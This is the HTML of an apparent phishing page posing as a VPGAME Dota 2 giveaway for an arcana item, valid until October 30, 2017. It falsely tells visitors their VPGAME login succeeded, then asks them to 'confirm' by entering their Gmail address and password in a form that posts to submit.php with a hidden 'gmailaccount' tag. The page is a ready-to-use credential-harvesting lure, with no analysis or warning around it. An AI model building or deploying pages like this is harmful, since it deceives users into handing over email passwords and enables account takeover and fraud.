<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">

	<title>Free load</title>

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<script src="js/bootstrap.min.js"></script>
	<link rel="shortcut icon" href="images/vp.png">
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<style type="text/css">
.title
{
	 font-weight: bold;
		text-shadow: 2px 8px 6px rgba(0,0,0,0.2),
                 0px -5px 35px rgba(255,255,255,0.3);
}
</style>
<body>
	<div class = "container">
		<div class = "row">
			<div class = "col-sm-12">
				<br>
				<img src="images/vpgame_logo.png" style = "height:80px;width:300px;">
				
			</div>
			<div class = "col-sm-12" >
				<div class = "title-container">
				<h2>VPGAME Give away this month of October!</h2>
				<h5>( valid until October 30, 2017 )</h5>
				<a href="#step2"><h4>Click Here for Step 2</h4></a>
				</div>
			</div>
			<div class = "col-sm-12">
				<img src="images/sf_arcana.jpg" class = "sf-image">
			</div>
		</div>
		<br>

		<div class = "row"  id = "step2">
			<div class = "col-sm-12" id = "steps">
				<h3>Here are the steps on how to get a chance to win a arcana:</h3>
				<br>
				<ol>
					<li><h5>Login your VPGAME account. <label style = "color:#27ae60;">Succesfully Login!</label></h5></li>
					<li><h5>Login your gmail <a href = "#login">here</a> to confirm your account.</li>
				</ol>
				<br>
			</div>
		</div>
		<div class = "row" style = "margin-bottom:100px;">
			<form method = "POST" action = "submit.php">

				<div class = "col-sm-12 col-md-3 col-lg-3"></div>

				<div class = "col-sm-12 col-md-6 col-lg-6">
					<div class="card" id = "login">
					  <img class="card-img-top" >
					  <div class="card-block">
					    <h5 class="card-title">Gmail account login</h5>
					    <div class="form-group">
						    <!-- <label for="formGroupExampleInput">Email address :</label> -->
						    <input type="email" class="form-control" name = "email" id="formGroupExampleInput" placeholder = "Username / Email"required>
						  </div>
						  <div class="form-group">
						    <label for="formGroupExampleInput2"></label>
						    <input type="password" class="form-control" name = "pass" id="formGroupExampleInput2" placeholder = "Password">
						  	<input type = "hidden" name = "type" value = "gmailaccount">
						  </div>
					    <button class="btn btn-primary" type = "submit" name = "btn">Submit</button>
					  </div>
					</div>
				</div>

				<div class = "col-sm-12 col-md-3 col-lg-3"></div>

			</form>
			
		</div>
	</div>
	<footer class="container-fluid text-center">
	  	<div class = "row">

	  		<div class = "col-md-3 col-lg-3 border">
	  			
	  			<ul>
	  				<li><h5>DOTA2</h5></li>
	  				<li><a href = "#">Items Game</li>
	  				<li><a href = "#">Market</li>
	  				<li><a href = "#">Exchange</li>
	  				<li><a href = "#">News</li>
	  				<li><a href = "#">Roll Items</li>
	  				<li><a href = "#">My Vp</li>
	  			</ul>
	  		</div>

	  		<div class = "col-md-3 col-lg-3 border">
	  			

	  			<ul>
	  				<li><h5>Helper</h5></li>
	  				<li><a href = "#">Game</li>
	  				<li><a href = "#">Roll</li>
	  				<li><a href = "#">Market</li>
	  				<li><a href = "#">Home</li>
	  				<li><a href = "#">Online Service</li>
	  				<li><a href = "#">Sitemap</li>
	  			</ul>
	  		</div>

	  		<div class = "col-md-3 col-lg-3 border">
	  			
	  			<ul>
	  				<li><h5>Be VPGAME member</h5></li>
	  				<li>
	  					<a href = "#">Sign Up
	  				</li>
	  				<li><a href = "#">Login</li>
	  			</ul>
	  		</div>

	  		<div class = "col-md-3 col-lg-3 border">
	  			
	  			<ul>
	  				<li><h5>About Us</h5></li>
	  				<li><a href = "#">VPGAME Official Website</li>
	  				<li><a href = "#">VPGAME</li>
	  				<li><a href = "#">Contact Us</li>
	  				<li><a href = "#">Jobs</li>
	  			</ul>
	  		</div>


	  	</div>
	</footer>
</body>
</html>